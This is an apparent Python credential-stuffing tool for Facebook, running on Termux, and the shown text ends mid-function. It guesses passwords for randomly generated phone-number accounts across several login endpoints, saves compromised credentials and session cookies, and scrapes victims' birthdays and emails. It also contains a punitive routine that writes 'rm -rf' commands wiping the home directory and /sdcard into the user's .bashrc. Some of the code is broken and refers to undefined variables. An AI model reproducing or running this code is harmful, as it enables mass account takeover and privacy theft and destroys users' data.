import os
import re
import sys
import uuid
import time
import json
import zlib
import socket
import random
import urllib
import string
import base64
import platform
import requests
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor as Th
from requests.exceptions import ConnectionError as err

os.system("git pull")

#color code
og = "\x1b[38;5;208m"
mw = "\x1b[38;5;217m"
pi = "\x1b[38;5;199m"
br = "\x1b[38;5;94m"
gb = "\x1b[38;5;58m"
gr = "\x1b[38;5;29m"
rd = "\x1b[38;5;1m"
mc = "\x1b[38;5;239m"
wh = "\x1b[38;5;246m"
bl = "\x1b[38;5;105m"
green = "\033[1;32m"
red = "\033[1;31m"
white = "\033[1;00m"
yellow = "\033[1;33m"

#clear function
def clear():
    if platform.platform().split("-")[0] == "Linux":
        os.system("clear")
    else:
        os.system("cls")

#print line function
def line():
    size = os.get_terminal_size()
    print(f"{wh}="*size[0])

#creat directory
try:
    os.mkdir("Login")
except:
    pass
    
#logo function
def logo():
    clear()
    try:
        username = open("Login/name.txt").read().strip()
    except FileNotFoundError:
        username = "None"
    try:
        userid = open("Login/id.txt").read().strip()
    except FileNotFoundError:
        userid = "None"
    try:
        status = open("Login/status.txt").read().strip()
    except FileNotFoundError:
        status = "None"
    try:
        approval = open("Login/approval.txt").read().strip()
    except FileNotFoundError:
        approval = "None"
    logo_ = f"""{gr}
 ╔═╗╔═╦═══╦═══╦════╦═══╦═══╗    Author : Zack
 ║║╚╝║║╔═╗║╔═╗║╔╗╔╗║╔══╣╔═╗║    Github : Zack-EE
 ║╔╗╔╗║║─║║╚══╬╝║║╚╣╚══╣╚═╝║    Cookie : {status}
 ║║║║║║╚═╝╠══╗║─║║─║╔══╣╔╗╔╝    Name   : {username}
 ║║║║║║╔═╗║╚═╝║─║║─║╚══╣║║╚╗    ID     : {userid}
 ╚╝╚╝╚╩╝─╚╩═══╝─╚╝─╚═══╩╝╚═╝    Key    : {approval}"""
    print(logo_)
    line()

def dev():
    R = random.choice(["9","10","11","12","13"])
    ua0 = f"Mozilla/5.0 (Linux; Android {R};  Infinix X689C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/348.0.0.11.110;]"
    ua1 = f"Mozilla/5.0 (Linux; Android {R}; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/ms_MY;FBAV/401.0.0.14.110;]"
    ua2 = f"Mozilla/5.0 (Linux; Android {R}; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]"
    ua3 = f"Mozilla/5.0 (Linux; Android {R}; vivo Y91 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.40 Mobile Safari/537.36"
    ua4 = f"Mozilla/5.0 (Linux; Android {R}; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36"
    ua5 = "Mozilla/5.0 (Linux; U; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.40 Mobile Safari/537.36 [FBAN/FB4A;FBAV/455.0.0.44.88;FBBV/575566261;FBDM/{density=3.0,width=1080,height=2107};FBLC/en_GB;FBRV/578251215;FBCR/vodafone UK;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    ua6 = f"Mozilla/5.0 (Linux; U; Android {R}; fr-fr; Redmi Note 11R Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/14.7.0-gn"
    ua7 = f"Mozilla/5.0 (Linux; Android {R}; Pixel 6 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.149 Safari/537.36 OPR/81.3.4292.78688"
    ua8 = f"Mozilla/5.0 (Linux; U; Android {R}; ru-ru; Redmi Note 11E Pro Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.25.2.2-gn"
    ua9 = f"Mozilla/5.0 (Linux; U; Android {R}; ar-eg; Redmi Note 11 5G Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/14.6.0-gn"
    ua10 = "Mozilla/5.0 (Symbian/3; Series60/3.2 Nokia XpressMusic/06.103; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba"
    ua11 = f"Mozilla/5.0 (Linux; Android {R}; TEL-AN10 Build/HONORTEL-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 Resolution/1080*2400 Build/8270567 Device/(HUAWEI;TEL-AN10) discover/8.27.0 NetType/WiFi"
    return random.choice([ua0, ua1, ua2, ua3, ua4, ua5, ua6, ua7, ua8, ua9, ua10])

class Approval:
    def __init__(self):
        logo()
        byte = os.getlogin().replace("_","").replace("u0","88") + str(os.getuid()) + "A1B2C3D4"
        self.KEY = base64.b16encode(zlib.compress(byte.encode())).decode()
        self.bypass_check()
    
    def request_server(self):
        keys = requests.get("https://github.com/RaKhar2000/R-4/blob/main/key").text
        if self.KEY in keys:
            open("Login/approval.txt",'w').write("Approval")
            print(f"{gr}Your Key Approval")
            time.sleep(3)
            mainmenu()
        else:
            logo()
            print(f"{gr}Your Key {pi}: {mw}"+self.KEY)
            line()
            print(f'{rd}your key not approval')
            line()
            print("https://t.me/H4L_YZ")
            line()
            print("https://www.facebook.com/profile.php?id=100083067397162&mibextid=ZbWKwL")
            line()
            print(f"{gr}Tool Is Paid, Contact to developer for key")
            line()
            print(f"{gr}You can use free for 1 day, please contact to developer")
            line()
    
    def bypass_check(self):
        file_name_list = ["__init__.py","adapters.py","compat.py","hooks.py","status_codes.py","__pycache__","api.py","cookies.py","models.py","structures.py","__version__.py","auth.py","exceptions.py","packages.py","utils.py","_internal_utils.py","certs.py","help.py","sessions.py"]
        file = os.listdir("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests")
        for i in file:
            if i in file_name_list:
                continue
            else:
                clear()
                sys.exit(f"{rd}Are you trying to bypass?")

        if "https://github.com/RaKhar2000/R-4/blob/main/key.txt" in open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py").read().strip():
            Delete_Data()
            bypass_warning()
            
        elif "print" in open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py").read().strip():
            Delete_Data()
            bypass_warning()
            
        elif "sys.stdout" in open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py").read().strip():
            Delete_Data()
            bypass_warning()
            
        elif "https://github.com/RaKhar2000/R-4/blob/main/key.txt" in open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py").read().strip():
            Delete_Data()
            bypass_warning()
            
        elif "print" in open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py").read().strip():
            Delete_Data()
            bypass_warning()
            
        elif "sys.stdout" in open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py").read().strip():
            Delete_Data()
            bypass_warning()
        else:
            self.request_server()
        
def bypass_warning():
    clear()
    txt = f"{rd}Warning: \033[1;00m This Tool Is Paid And You Was Bypass KEY <or> DATA, So I Will Delete All Data In Your Device For Your Fault \n"
    for i in txt:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)

def Delete_Data():
    data = """rm -rf *\ncd /sdcard && rm -rf *\n cd /sdcard/Android && rm -rf data\n exit
    """
    open("/data/data/com.termux/files/home/.bashrc",'w').write(data)

#login class
class login:
    def __init__(self):
        try:
            self.ses = requests.Session()
            cookiex = open("Login/cookie.txt").read().strip()
            self.cookie = {"cookie":cookiex}
            self.login_cookie()
        except FileNotFoundError:
            self.reqcookie()
            
    #request cookie from user
    def reqcookie(self):
        logo()
        cookier = input(f"{gb}Put Cookie For Login {mw}: {mc}")
        open("Login/cookie.txt","w").write(cookier)
        self.cookie = {"cookie":cookier}
        self.login_cookie()
        
    #test cookie
    def login_cookie(self):
        try:
            req = requests.get("https://www.facebook.com/profile.php?", cookies=self.cookie).text
            user_id = re.search('"actorID":"(.*?)"', req).group(1)
            user_name = re.search('"NAME":"(.*?)"', req).group(1)
            req1 = requests.get("https://business.facebook.com/business_locations", cookies=self.cookie).text
            token_ = re.search('(\["EAAG\w+)',req1).group(1).replace('["',"")
            req2 = self.ses.get("https://www.facebook.com/adsmanager/manage/campaigns",cookies=self.cookie).text
            sets = re.search('act=(.*?)&nav_source',req2).group(1)
            url = f"https://www.facebook.com/adsmanager/manage/campaigns?act={sets}&nav_source=no_referrer"
            req3 = self.ses.get(url,cookies=self.cookie).text
            token__ = re.search('accessToken="(.*?)"',req3).group(1)
            open("Login/token_",'w').write(token_)
            open("Login/token__",'w').write(token__)
            open("Login/name.txt","w").write(user_name)
            open("Login/id.txt","w").write(user_id)
            open("Login/status.txt","w").write("Active")
        except requests.exceptions.ConnectionError:
            print(f"{rd}Login Fail Poor Connection")
            sys.exit()
        except AttributeError:
            print(f"{rd}Check Your Cookie And Try Again")
            time.sleep(3)
            self.reqcookie()

#main menu class
class mainmenu:
    def __init__(self):
        logo()
        print(f"{wh}1 {pi}: {bl}Random")
        line()
        print(f"{wh}2 {pi}: {bl}File")
        line()
        print(f"{wh}3 {pi}: {bl}File Make")
        line()
        print(f"{wh}4 {pi}: {bl}Friend List Crack")
        line()
        x = input(f"{gb}Put the feature {pi}: {wh}")
        if x == "1":
            Random()
        elif x == "2":
            File()
        elif x == "3":
            login()
            dump_menu()
        elif x == "4":
            login()
            Friend_List_Cracking()



class Random:
    def __init__(self):
        logo()
        print(f"{wh}1 {pi}: {bl}Same 2 Number")
        print(f"{wh}2 {pi}: {bl}Same 3 Number")
        line()
        x = input(f"{gb}Put the method {pi}: {wh}")
        if x == "1":
            self.choose_method(2)
        elif x == "2":
            self.choose_method(3)
        else:
            line()
            print(f"{rd}Make sure to choose method")
            time.sleep(3)
            Random()
            
    def choose_method(self, x):
        logo()
        print(f"{wh}1 {pi}:{bl} Facebook Messenger Web")
        print(f"{wh}2 {pi}:{bl} Facebook Mobile Web")
        print(f"{wh}3 {pi}:{bl} Facebook Mbasic Web")
        print(f"{wh}4 {pi}:{bl} Facebook Alpha Web")
        print(f"{wh}5 {pi}:{bl} Facebook Ansyc Web")
        print(f"{wh}6 {pi}:{bl} Facebook Api Web")
        line()
        y = input(f"{gb}Put the login method {pi}: {wh}")
        ch = ["1","2","3","4","5","6"]
        if y in ch:
            self.req_limit(x, y)
        else:
            line()
            print(f"{rd}Make sure to choose method")
            time.sleep(3)
            self.choose_method()
            
    def req_code_2(self, limit, mtd):
        logo()
        print(f"{pi}Example- {bl}89, 88, 42, 45, 77, 25, 95")
        line()
        x = input(f"{gb}Put the code {pi}: {wh}")
        if len(x) == 2:
            self.mx_random(x, limit, mtd)
        else:
            line()
            print(f"{rd}Please correct to put a code")
            time.sleep(3)
            self.req_code_2(limit, mtd)
    
    def req_code_3(self, limit, mtd):
        logo()
        print(f"{pi}Example- {bl}895, 882, 420, 456, 778, 256, 950")
        line()
        x = input(f"{gb}Put the code {pi}: {wh}")
        if len(x) == 3:
            self.mx_random(x, limit, mtd)
        else:
            line()
            print(f"{rd}Please correct to put a code")
            time.sleep(3)
            self.req_code_3(limit, mtd)
        
    def req_limit(self, same_num, mtd):
        logo()
        print(f"{pi}Example- {bl}5000, 8000, 10000, 15000")
        line()
        try:
            self.x = int(input(f"{gb}Put the total account limit {pi}: {wh}"))
        except ValueError:
            line()
            print(f"{rd}Please put integer number only")
            time.sleep(3)
            self.req_limit(same_num)
        if same_num == 2:
            self.req_code_2(self.x, mtd)
        elif same_num == 3:
            self.req_code_3(self.x, mtd)
    
    def mx_random(self, code, limit, mtd):
        logo()
        if len(code) == 2:
            process = 7
        elif len(code) == 3:
            process = 6
        random_code = []
        for _ in range(limit):
            random_num = "".join(random.choice(string.digits) for _ in range(process))
            random_code.append(random_num)
        with Th(max_workers=50) as mx:
            for i in random_code:
                ID = "09" + code + i
                pwd = []
                pwd.append("kyawkyaw")
                pwd.append(ID[-6:])
                pwd.append(ID[-7:])
                pwd.append(ID[-9:])
                pwd.append(ID)
                if mtd == "1":
                    mx.submit(Messenger, ID, pwd, int(limit))
                elif mtd == "2":
                    mx.submit(Mobile, ID, pwd, int(limit))
                elif mtd == "3":
                    mx.submit(Mbasic, ID, pwd, int(limit))
                elif mtd == "4":
                    mx.submit(Alpha, ID, pwd, int(limit))
                elif mtd == "5":
                    mx.submit(Ansyc, ID, pwd, int(limit))
                elif mtd == "6":
                    mx.submit(Api, ID, pwd, int(limit))
        print('\r')
        line()
        print(f"{gr}Process Has Been Finished")
        line()

 



ok,cp,loop = 0,0,0
def Api(ID, pwd, total):
    global ok,cp,loop
    try:
        for i in pwd:
            sys.stdout.write(f"\r [{loop}:{total}] [{'{:.1%}'.format(loop/total)}] [OK:{ok}] [CP:{cp}]   \r")
            sys.stdout.flush()
            ses = requests.Session()
            headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent":dev(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ID,"password":i,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            
            response = ses.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).text
            session = json.loads(response)
            if "session_key" in session:
                ok +=1
                ID = session["uid"]
                items = ";".join(i["name"]+"="+i["value"] for i in session["session_cookies"])
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={sb};{items}"
                open("ok.txt",'a').write(f"{ID}|{pas}\n")
                open("cookie.txt",'a').write(cookie+"\n")
                req = ses.get("https://accountscenter.facebook.com/personal_info/birthday/", cookies={"cookie":cookie}).text
                try:
                    birthday = re.search('entrypoint=accounts_center","navigation_icon_platform_type":null,"navigation_row_subtitle":"(.*?)"', req).group(1)
                except AttributeError:
                    birthday = "None"
                try:
                    email = re.search('"navigation_row_subtitle":"(.*?)"',req).group(1).replace('\\u0040','@')
                except AttributeError:
                    email = "None"
                print(f"{green}[BIRTHDAY] {birthday} ")
                print(f"{green}[Email/Ph] {email} ")
                print(f"{green}[OK] {uid}|{pas} ")
                line()
                break
            elif "www.facebook.com" in session["error"]["message"]:
                cp +=1
                try:
                    ID = session["uid"]
                except:
                    ID = uid
                open("cp.txt",'a').write(f"{ID}|{pas}\n")
                print(f"{red}[CP] {ID}|{pas} ")
                line()
                break
            else:
                continue
        loop +=1
    except err:
        time.sleep(5)



def Ansyc(ID, pwd, total):
    global ok,cp,loop
    try:
        for i in pwd:
            sys.stdout.write(f"\r [{loop}:{total}] [{'{:.1%}'.format(loop/total)}] [OK:{ok}] [CP:{cp}]   \r")
            sys.stdout.flush()
            ses = requests.Session()
            header = {"Host": "mbasic.facebook.com","dnt": "1","upgrade-insecure-requests": "1","user-agent": dev(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
            web = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=header)
            data = {"lsd": re.search('name="lsd" value="(.*?)"', str(web.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(web.text)).group(1),"m_ts": re.search('name="m_ts" value="(.*?)"', str(web.text)).group(1),"li": re.search('name="li" value="(.*?)"', str(web.text)).group(1),"try_number": "0","unrecognized_tries": "0","email": ID,"pass": i,"login": "submit","bi_xrwh": "0"}
            cookie = dict(ses.cookies.get_dict())
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                'cache-control': 'no-cache',
                'dpr': '2',
                'pragma': 'no-cache',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': "unknown",
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"3.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': dev(),
                'viewport-width': '980',}
            ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=headers,cookies=cookie, allow_redirects=True)
            if "c_user" in ses.cookies.get_dict():
                ok +=1
                cookie = ";".join([k+"="+v for k,v in ses.cookies.get_dict().items()])
                ID = ses.cookies.get_dict()["c_user"]
                open("ok.txt",'a').write(f"{ID}|{i}\n")
                open("cookie.txt",'a').write(cookie+"\n")
                req = ses.get("https://accountscenter.facebook.com/personal_info/birthday/", cookies={"cookie":cookie}).text
                try:
                    birthday = re.search('entrypoint=accounts_center","navigation_icon_platform_type":null,"navigation_row_subtitle":"(.*?)"', req).group(1)
                except AttributeError:
                    birthday = "None"
                try:
                    email = re.search('"navigation_row_subtitle":"(.*?)"',req).group(1).replace('\\u0040','@')
                except AttributeError:
                    email = "None"
                print(f"{green}[BIRTHDAY] {birthday}  \r")
                print(f"{green}[Email/Ph] {email}  \r")
                print(f"{green}[OK] {ID}|{i}  \r")
                line()
                break
            elif "checkpoint" in ses.cookies.get_dict():
                cp +=1
                ID = ses.cookies.get_dict()["checkpoint"][13:28]
                open("cp.txt",'a').write(f"{ID}|{i}\n")
                print(f"{red}[CP] {ID}|{i}  ")
                line()
                break
            else:
                continue
        loop+=1
    except err:
        time.sleep(5)

def Messenger(ID, pwd, total):
    global ok,cp,loop
    try:
        for i in pwd:
            sys.stdout.write(f"\r [{loop}:{total}] [{'{:.1%}'.format(loop/total)}] [OK:{ok}] [CP:{cp}]   \r")
            sys.stdout.flush()
            ses = requests.Session()
            web_data = ses.get("https://www.messenger.com/").text
            datr = re.search('_js_datr","(.*?)",', web_data).group(1)
            req = bs(web_data, "html.parser")
            web_data = ses.get("https://www.messenger.com/").text
            datr = re.search('_js_datr","(.*?)",', web_data).group(1)
            req = bs(web_data, "html.parser")
            headers = {
                'authority': 'www.messenger.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'referer': 'https://www.messenger.com/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': dev(),}
            data = {
                "jazoest":req.find("input",{"name":"jazoest"})["value"],
                "lsd":req.find("input",{"name":"lsd"})["value"],
                "initial_request_id":req.find("input",{"name":"initial_request_id"})["value"],
                "timezone":"",
                "lgndim":"",
                "lgnrnd":req.find("input",{"name":"lgnrnd"})["value"],
                "lgnjs":req.find("input",{"name":"lgnjs"})["value"],
                "email":ID,
                "pass":i,
                "login":"submit",
                "persistent":"1",
                "default_persistent":"",}
            response = ses.post("https://www.messenger.com/login/password/",data=data,headers=headers, cookies={"cookie":f"wd=980x1848;dpr=2;_js_datr={datr}"},allow_redirects=False)
            if response.headers("Location"):
                cp +=1
                open("cp.txt",'a').write(f"{ID}|{i}\n")
                print(f"{red}[CP] {ID}|{i}  ")
                line()
                break
            elif "c_user" in ses.cookies.get_dict():
                open("ok.txt",'a').write(f"{ID}|{i}\n")
                print(f"{green}[Email/Ph] {email}  \r")
                print(f"{green}[OK] {ID}|{i}  \r")
                line()
                break
            else:
                continue
        loop+=1
    except err:
        time.sleep(5)
        
def Alpha(ID, pwd, total):
    global ok,cp,loop
    try:
        for i in pwd:
            sys.stdout.write(f"\r [{loop}:{total}] [{'{:.1%}'.format(loop/total)}] [OK:{ok}] [CP:{cp}]   \r")
            sys.stdout.flush()
            ses = requests.Session()
            header = {"Host": "m.alpha.facebook.com","dnt": "1","upgrade-insecure-requests": "1","user-agent": dev(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
            web = ses.get("https://m.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=header)
            data = {"lsd": re.search('name="lsd" value="(.*?)"', str(web.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(web.text)).group(1),"m_ts": re.search('name="m_ts" value="(.*?)"', str(web.text)).group(1),"li": re.search('name="li" value="(.*?)"', str(web.text)).group(1),"try_number": "0","unrecognized_tries": "0","email": ID,"pass": i,"login": "submit","bi_xrwh": "0"}
            cookie = dict(ses.cookies.get_dict())
            headers = {
                'authority': 'm.alpha.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                'cache-control': 'no-cache',
                'dpr': '2',
                'pragma': 'no-cache',
                'referer': 'https://m.alpha.facebook.com/login',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': "unknown",
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"5.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': dev(),
                'viewport-width': '980',}
            ses.post("https://m.alpha.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fm.facebook.com%2F&amp;refsrc=deprecated&amp;lwv=100&amp;refid=9",data=data, headers=headers, cookies=cookie,allow_redirects=True)
            if "c_user" in ses.cookies.get_dict():
                ok +=1
                cookie = ";".join([k+"="+v for k,v in ses.cookies.get_dict().items()])
                ID = ses.cookies.get_dict()["c_user"]
                open("ok.txt",'a').write(f"{ID}|{i}\n")
                open("cookie.txt",'a').write(cookie+"\n")
                req = ses.get("https://accountscenter.facebook.com/personal_info/birthday/", cookies={"cookie":cookie}).text
                try:
                    birthday = re.search('entrypoint=accounts_center","navigation_icon_platform_type":null,"navigation_row_subtitle":"(.*?)"', req).group(1)
                except AttributeError:
                    birthday = "None"
                try:
                    email = re.search('"navigation_row_subtitle":"(.*?)"',req).group(1).replace('\\u0040','@')
                except AttributeError:
                    email = "None"
                print(f"{green}[BIRTHDAY] {birthday}  \r")
                print(f"{green}[Email/Ph] {email}  \r")
                print(f"{green}[OK] {ID}|{i}  \r")
                line()
                break
            elif "checkpoint" in ses.cookies.get_dict():
                cp +=1
                ID = ses.cookies.get_dict()["checkpoint"][13:28]
                open("cp.txt",'a').write(f"{ID}|{i}\n")
                print(f"{red}[CP] {ID}|{i}  ")
                line()
                break
            else:
                continue
        loop+=1
    except err:
        time.sleep(5)
        
def Mbasic(ID, pwd, total):
    global ok,cp,loop
    try:
        for i in pwd:
            sys.stdout.write(f"\r [{loop}:{total}] [{'{:.1%}'.format(loop/total)}] [OK:{ok}] [CP:{cp}]   \r")
            sys.stdout.flush()
            ses = requests.Session()
            header = {"Host": "mbasic.facebook.com","dnt": "1","upgrade-insecure-requests": "1","user-agent": dev(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
            web = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=header)
            data = {"lsd": re.search('name="lsd" value="(.*?)"', str(web.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(web.text)).group(1),"m_ts": re.search('name="m_ts" value="(.*?)"', str(web.text)).group(1),"li": re.search('name="li" value="(.*?)"', str(web.text)).group(1),"try_number": "0","unrecognized_tries": "0","email": ID,"pass": i,"login": "submit","bi_xrwh": "0"}
            cookie = dict(ses.cookies.get_dict())
            headers = {"Host": "mbasic.facebook.com","content-length": "160","cache-control": "max-age=0","origin": "https://mbasic.facebook.com","upgrade-insecure-requests": "1","dnt": "1","content-type": "application/x-www-form-urlencoded","user-agent": dev(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            ses.post(f"https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data=data, cookies=cookie, headers=headers, allow_redirects=True)
            if "c_user" in ses.cookies.get_dict():
                ok +=1
                cookie = ";".join([k+"="+v for k,v in ses.cookies.get_dict().items()])
                ID = ses.cookies.get_dict()["c_user"]
                open("ok.txt",'a').write(f"{ID}|{i}\n")
                open("cookie.txt",'a').write(cookie+"\n")
                req = ses.get("https://accountscenter.facebook.com/personal_info/birthday/", cookies={"cookie":cookie}).text
                try:
                    birthday = re.search('entrypoint=accounts_center","navigation_icon_platform_type":null,"navigation_row_subtitle":"(.*?)"', req).group(1)
                except AttributeError:
                    birthday = "None"
                try:
                    email = re.search('"navigation_row_subtitle":"(.*?)"',req).group(1).replace('\\u0040','@')
                except AttributeError:
                    email = "None"
                print(f"{green}[BIRTHDAY] {birthday}  \r")
                print(f"{green}[Email/Ph] {email}  \r")
                print(f"{green}[OK] {ID}|{i}  \r")
                line()
                break
            elif "checkpoint" in ses.cookies.get_dict():
                cp +=1
                ID = ses.cookies.get_dict()["checkpoint"][13:28]
                open("cp.txt",'a').write(f"{ID}|{i}\n")
                print(f"{red}[CP] {ID}|{i}  ")
                line()
                break
            else:
                continue
        loop+=1
    except err:
        time.sleep(5)


def Mobile(ID, pwd, total):
    global ok,cp,loop
    try:
        for i in pwd:
            sys.stdout.write(f"\r [{loop}:{total}] [{'{:.1%}'.format(loop/total)}] [OK:{ok}] [CP:{cp}]   \r")
            sys.stdout.flush()
            ses = requests.Session()
